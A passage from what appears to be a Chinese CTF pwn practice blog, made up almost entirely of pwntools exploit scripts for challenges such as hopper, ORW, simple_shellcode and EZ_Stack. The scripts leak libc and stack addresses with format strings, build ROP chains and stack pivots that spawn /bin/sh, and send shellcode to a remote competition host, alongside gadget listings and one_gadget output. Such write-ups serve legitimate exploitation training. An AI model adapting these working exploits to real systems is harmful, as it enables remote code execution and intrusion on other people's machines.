class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(address))</span><br><span class="line"></span><br><span class="line">libc_addr = address - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">128</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x2a3e5</span>+libc_addr</span><br><span class="line">binsh=libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rsi=<span class="number">0x2be51</span>+libc_addr</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+ p64(bss+<span class="number">0x500</span>) </span><br><span class="line">payload+= p64(rdi)+ p64(binsh)+ p64(system)</span><br><span class="line">p.sendafter(<span class="string">&#x27;magic&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x78 is writable</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x48 is writable</span></span><br><span class="line"><span class="string">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  address rbp-0x50 is writable</span></span><br><span class="line"><span class="string">  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="hopper"><a href="#hopper" class="headerlink" title="hopper"></a>hopper</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250315150516.png" alt="Pasted image 20250315150516"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">p = process(<span class="string">&#x27;./Hopper&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_rsi = <span class="number">0x401017</span>  </span><br><span class="line">syscall = <span class="number">0x40100A</span>  </span><br><span class="line">xchg = <span class="number">0x40100C</span>  </span><br><span class="line">pop_r15=<span class="number">0x40101C</span>  </span><br><span class="line">  </span><br><span class="line">gdb.attach(p)  </span><br><span class="line">pause()  </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;    (&quot; ~----( ~   Y.  )\n&#x27;</span>)  </span><br><span class="line">a = p.recvline()[:<span class="number">6</span>]  </span><br><span class="line">a = <span class="built_in">int</span>.from_bytes(a,<span class="string">&#x27;little&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---&gt;&quot;</span>,<span class="built_in">hex</span>(a))  </span><br><span class="line">payload = p64(pop_r15)+p64(pop_rsi)+p64(<span class="number">0</span>)  </span><br><span class="line">payload += p64(a+<span class="number">0x28</span>) + p64(<span class="number">0</span>)  </span><br><span class="line">payload += p64(<span class="number">59</span>) + p64(syscall)  </span><br><span class="line">payload += p64(<span class="number">0x401021</span>)+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="NPC2CTF"><a href="#NPC2CTF" class="headerlink" title="NPC2CTF"></a><strong>NPC2CTF</strong></h2><h3 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h3><h4 id="ORW（Day1-25-2-23）"><a href="#ORW（Day1-25-2-23）" class="headerlink" title="ORW（Day1 25/2/23）"></a>ORW（Day1 25/2/23）</h4><p><a href="https://blog.csdn.net/2301_79880074/article/details/136008071">格式化字符串漏洞的两种利用姿势+orw沙盒利用_格式化字符串泄露canary-CSDN博客</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x000000000002be51 : pop rsi ; ret</span><br><span class="line">0x0000000000035dd1 : pop rbx ; ret</span><br><span class="line">0x000000000002be51 : pop rsi ; ret</span><br><span class="line">0x0000000000045eb0 : pop rax ; ret</span><br><span class="line">0x000000000002a3e5 : pop rdi ; ret</span><br><span class="line">0x00000000000904a9 : pop rdx ; pop rbx ; ret</span><br></pre></td></tr></table></figure><br><code>ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; |grep &quot;rax&quot;</code><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]  </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&#x27;./orw&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;175.27.249.18&#x27;</span>,<span class="number">31548</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc = &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">rsi=<span class="number">0x000000000002be51</span>+libc.address</span><br><span class="line">rdi=<span class="number">0x000000000002a3e5</span>+libc.address</span><br><span class="line">rdx_rbx=<span class="number">0x00000000000904a9</span>+libc.address</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000035dd1 : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000045eb0 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x00000000000904a9 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000002a3e5</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">read=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">syscall=libc.sym[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x403400</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">88</span></span><br><span class="line"><span class="comment">#调用read(0, bss_addr, 4)读入&quot;flag&quot;</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line"><span class="comment">#调用syscall(2,bss,0)</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">2</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line"><span class="comment">#read(3(文件), bss, 0x100)</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line"><span class="comment">#puts(bss)</span></span><br><span class="line">payload+=p64(rdi)+p64(bss)+p64(puts)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h4 id="simple-shellcode（Day0-25-2-22）"><a href="#simple-shellcode（Day0-25-2-22）" class="headerlink" title="simple_shellcode（Day0 25/2/22）"></a>simple_shellcode（Day0 25/2/22）</h4><h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;175.27.249.18&#x27;</span>, <span class="number">30369</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成并汇编shellcode</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&#x27;plz: &#x27;</span>, shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h5 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;175.27.249.18 30924&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = gift.elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;Shellcode plz: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">add qword ptr [rsp], 0x30</span></span><br><span class="line"><span class="string">mov rsp, qword ptr [rsp]</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x424030</span></span><br><span class="line"><span class="string">mov rdx, 0x8</span></span><br><span class="line"><span class="string">mov qword ptr [rbp + 0x8], 0x4011FA</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4012CB</span></span><br><span class="line">payload = p64(elf.plt.write) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">s(asm(shellcode).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x90&#x27;</span>) + payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64_ex(r(<span class="number">8</span>)) - <span class="number">0x11EA10</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi, <span class="subst">&#123;<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)):#x&#125;</span></span></span><br><span class="line"><span class="string">mov rsi, <span class="subst">&#123;libc.sym.system:#x&#125;</span></span></span><br><span class="line"><span class="string">add rsp, 0x8</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s(asm(shellcode))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EZ-Stack（Day1-25-2-23）"><a href="#EZ-Stack（Day1-25-2-23）" class="headerlink" title="EZ_Stack（Day1 25/2/23）"></a>EZ_Stack（Day1 25/2/23）</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250217193308.png" alt="Pasted image 20250217193308">开了NX<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//也许有用的gadget</span></span><br><span class="line"><span class="number">0x000000000040117d</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000401203</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x000000000040101a</span> : ret</span><br><span class="line"><span class="number">0x000000000040103a</span> : jmp <span class="number">0x401020</span></span><br><span class="line"><span class="number">0x0000000000401194</span> : jmp <span class="number">0x401120</span></span><br><span class="line"><span class="number">0x000000000040100b</span> : jmp <span class="number">0x4840103f</span></span><br><span class="line"><span class="number">0x0000000000401217</span> : jmp <span class="number">0x48401229</span></span><br><span class="line"><span class="number">0x000000000040110c</span> : jmp rax</span><br><span class="line"><span class="number">0x000000000040101a</span> : ret</span><br><span class="line"></span><br><span class="line"><span class="number">0x000000000040127f</span> : leave ; ret</span><br></pre></td></tr></table></figure><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250218214438.png" alt="Pasted image 20250218214438"></p><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>格式化字符串泄露libc+栈迁移</p><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>printf处下断点<br><code>b* 0x401254</code><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223144004.png" alt="Pasted image 20250223144004"><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223152812.png" alt="Pasted image 20250223152812"><br><strong>6</strong></p><h5 id="泄露rbp"><a href="#泄露rbp" class="headerlink" title="泄露rbp"></a>泄露rbp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>) </span><br><span class="line">payload=<span class="string">b&#x27;AAAA&#x27;</span>+<span class="string">b&#x27;%22$p&#x27;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you \n&quot;</span>) </span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAA&quot;</span>) </span><br><span class="line">rbp = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>), <span class="number">16</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp)) </span><br><span class="line">pause() </span><br><span class="line">buf=rbp-<span class="number">0x30</span>-<span class="number">0x80</span> </span><br><span class="line">pop_rdi=<span class="number">0x0401203</span> </span><br><span class="line">lea_ret=<span class="number">0x040127f</span> </span><br><span class="line">ret=<span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi) </span><br><span class="line">payload+=p64(puts_got) </span><br><span class="line">payload+=p64(puts_plt) </span><br><span class="line">payload+=p64(<span class="number">0x0401208</span>) </span><br><span class="line">payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>) </span><br><span class="line">payload+=p64(buf) </span><br><span class="line">payload+=p64(lea_ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know stack pivating?&quot;</span>) p.send(payload)</span><br></pre></td></tr></table></figure><p><code>22=6+128//8</code><br><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223172641.png" alt="Pasted image 20250223172641"></p><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223173503.png" alt="Pasted image 20250223173503"><br><code>0xb0=0xb00-0xa50</code></p><h5 id="本地exp"><a href="#本地exp" class="headerlink" title="本地exp"></a>本地exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;175.27.249.18&#x27;,30150)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc</span></span><br><span class="line"><span class="comment"># payload1=b&#x27;AAA%8$s%9$s%10$s&#x27;+p64(puts_got)+p64(printf_got)+p64(read_got)</span></span><br><span class="line"><span class="comment"># p.sendafter(&quot;What&#x27;s your name?\n&quot;,payload1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Nice to meet you \n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data=p.recv(27)</span></span><br><span class="line"><span class="comment"># puts_addr=u64(data[3:9].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># printf_addr=u64(data[9:15].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># read_addr=u64(data[15:21].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># success(&quot;puts_addr: &quot;+hex(puts_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;printf_addr: &quot;+hex(printf_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;read_addr: &quot;+hex(read_addr))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#泄露rbp</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;AAA%22$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rbp = <span class="built_in">int</span>(p.recv(<span class="number">17</span>)[<span class="number">3</span>:],<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">base=<span class="number">0x00007ffff7c00000</span></span><br><span class="line">  </span><br><span class="line">bin_sh=libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">bin_addr=base+bin_sh</span><br><span class="line">pop_rdi=<span class="number">0x401203</span></span><br><span class="line">leave_ret=<span class="number">0x40127</span></span><br><span class="line">system_addr=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_rbp=rbp-<span class="number">0xb0</span>-<span class="number">8</span></span><br><span class="line">payload2= p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">128</span>-<span class="number">24</span>)+p64(fake_rbp)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Do you know stack pivating?\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="远程exp"><a href="#远程exp" class="headerlink" title="远程exp"></a>远程exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezstack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&#x27;./ezstack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;175.27.249.18&#x27;</span>,<span class="number">30999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc</span></span><br><span class="line"><span class="comment"># payload1=b&#x27;AAA%8$s%9$s%10$s&#x27;+p64(puts_got)+p64(printf_got)+p64(read_got)</span></span><br><span class="line"><span class="comment">## fmt对应第7个，puts_got对应第8个</span></span><br><span class="line"><span class="comment"># p.sendafter(&quot;What&#x27;s your name?\n&quot;,payload1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(&quot;Nice to meet you \n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data=p.recv(27)</span></span><br><span class="line"><span class="comment"># puts_addr=u64(data[3:9].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># printf_addr=u64(data[9:15].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># read_addr=u64(data[15:21].ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># success(&quot;puts_addr: &quot;+hex(puts_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;printf_addr: &quot;+hex(printf_addr))</span></span><br><span class="line"><span class="comment"># success(&quot;read_addr: &quot;+hex(read_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#be0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露rbp</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;AAAAAAA%8$s%22$p&#x27;</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;AAAAAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;rbp:&quot;</span>+<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">base=puts_addr-<span class="number">0x080e50</span></span><br><span class="line"></span><br><span class="line">bin_addr=base+<span class="number">0x1d8678</span></span><br><span class="line">pop_rdi=<span class="number">0x401203</span></span><br><span class="line">leave_ret=<span class="number">0x40127f</span></span><br><span class="line">system_addr=base+<span class="number">0x050d70</span> </span><br><span class="line"></span><br><span class="line">fake_rbp=rbp-<span class="number">0xb0</span>-<span class="number">8</span></span><br><span class="line">payload2= p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">128</span>-<span class="number">24</span>)+p64(fake_rbp)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Do you know stack pivating?\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h3><h4 id="List（Day2-25-2-24）"><a href="#List（Day2-25-2-24）" class="headerlink" title="List（Day2 25/2/24）"></a>List（Day2 25/2/24）</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250224170216.png" alt="Pasted image 20250224170216"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400acc</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400ace</span> : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400ad0</span> : pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400ad2</span> : pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400acb</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span 